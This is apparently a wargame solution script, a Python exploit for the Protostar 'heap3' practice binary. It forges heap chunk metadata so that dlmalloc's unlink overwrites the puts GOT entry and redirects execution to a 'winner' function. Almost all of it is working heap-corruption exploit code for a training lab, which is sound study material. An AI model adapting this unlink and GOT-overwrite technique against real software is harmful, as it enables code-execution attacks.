#!/usr/bin/env python
#-*- coding: utf-8 -*-

import sys
import struct
import subprocess
import re

# awful solution, but proud to not had read any documentation/write-up.
# dont use this code as a guide, because it will mislead more than help you

binary = '/opt/protostar/bin/heap3'
var_name = 'winner'

def find_var_addr(binary, var_name):
    hex_regex = re.compile('^0x[0-9A-Fa-f]{8}')
    if hex_regex.match(var_name):
        return int(var_name[2:].strip(), base=16)
    addr = 0
    p1 = subprocess.Popen(["objdump", "-D", binary], stdout=subprocess.PIPE)
    p2 = subprocess.Popen(["grep", "-m", "1", '<'+var_name+'>'], 
                          stdin=p1.stdout, stdout=subprocess.PIPE)
    p3 = subprocess.Popen(["awk", "{FS = \" \"; print $1}" ], 
                          stdin=p2.stdout, stdout=subprocess.PIPE)
    p1.stdout.close()
    p2.stdout.close()
    res = p3.communicate()[0]
    if not res:
        print('[-] Variable not found. Note that this only works for variables ' \
              '(not functions). We search objdump output for \"<var_name>\"')
        exit()
    addr = int(res.strip(), base=16)
    return addr

where = 'puts-12@plt' # objdump -d -j .plt bin (or objdump -R bin)
addr1 = 0x804b128 - 12
print('[+] Address to write in ({0} - 12) = {1}'.format(where, hex(addr1)))
where = 'a+12@heap'
addr2 = 0x804c008 + 12 # in the middle of the 'a' variable
print('[+] Address to be written ({0}) = {1}'.format(where, hex(addr2)))

'''UNLINK:
    FD = p->fd
    BK = p->bk
    FD->bk = BK
    BK->fd = FD
'''

winner = find_var_addr(binary, var_name)
a = 'A' * 12  # this is overwritten with the last free(a)
# here is where we will jump after overwriting the .got
a += '\x68' + struct.pack('<L', winner) + '\xc3' # our payload.push @winner;ret


b = 'A' * 20
# any low value here will work. it's used in free to know 
# (if i remember correctly) to know where a next chunk is. nextchunk = (p+size)
b += struct.pack('<L', 0xfffffff5) 
# trash. another unlink is called (who knows why...)
# so I write shit in a writable shitty place.
# I think to remember this happened on the free(c)
b += struct.pack('<L', addr1 + 0x1b)
b += struct.pack('<L', addr2 + 0x20)
# overwrite metadata of 'c'
prev_size = 0xfffffff0 # ca2 '-16'
size = 0xfffffff0 # prev_in_use = 0, to trigger unlink on 'b'
b += struct.pack('<L', prev_size)
b += struct.pack('<L', size)


c = 'A' * 16
c += struct.pack('<L', addr1)
c += struct.pack('<L', addr2)



with open('payload', 'w') as fd1:
    fd1.write(a  + ' ' + b + ' ' + c)

fd2 = open('out', 'w')
cmd = binary + ' ' + a + ' ' + b + ' ' + c
print('[+] Command: {0}'.format(cmd))
p1 = subprocess.Popen(cmd, stdin=subprocess.PIPE, 
    stdout=fd2, stderr=fd2, shell=True)
print('[+] Output written in \"out\" file.')

p = subprocess.Popen('cat out', stdin=subprocess.PIPE, 
stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
res = p.communicate()[0]
print('[+] \'out\' file contents: ')
print(res)

